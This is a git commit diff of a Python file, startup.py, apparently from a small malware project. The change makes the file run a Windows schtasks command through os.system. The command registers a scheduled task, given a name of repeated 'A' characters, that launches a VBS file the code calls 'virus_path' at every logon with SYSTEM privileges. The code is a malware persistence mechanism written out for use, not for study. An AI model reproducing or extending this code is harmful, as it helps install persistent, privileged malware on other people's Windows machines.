b02e32d877cb388a571f9428dcf003d94b7d0c78
Kr0dÿ <91196264+Retr0Kr0dy@users.noreply.github.com>
2021-12-28 14:55:28 +0100

    Update startup.py

--- py/startup.py
+++ py/startup.py
@@ -6,6 +6,6 @@ user = getpass.getuser()
 c_path = "C:\\Users\\" + user + "\\"
 startup_path = c_path + "AppData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
 desktop_path = c_path + "Desktop\\"
-virus_path = desktop_path + "test.py"
-passpath = f"""cmd /c "schtasks /create /tn "test" /sc onstart /ru system /tr "cmd.exe /c py C:\\Users\\{user}\\Desktop\\test.py"""""
+virus_path = cwd + "\\a.vbs"
+passpath = f"""cmd /c "schtasks.exe /create /tn "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" /sc onlogon /ru system /tr {virus_path}" """
 os.system(passpath)
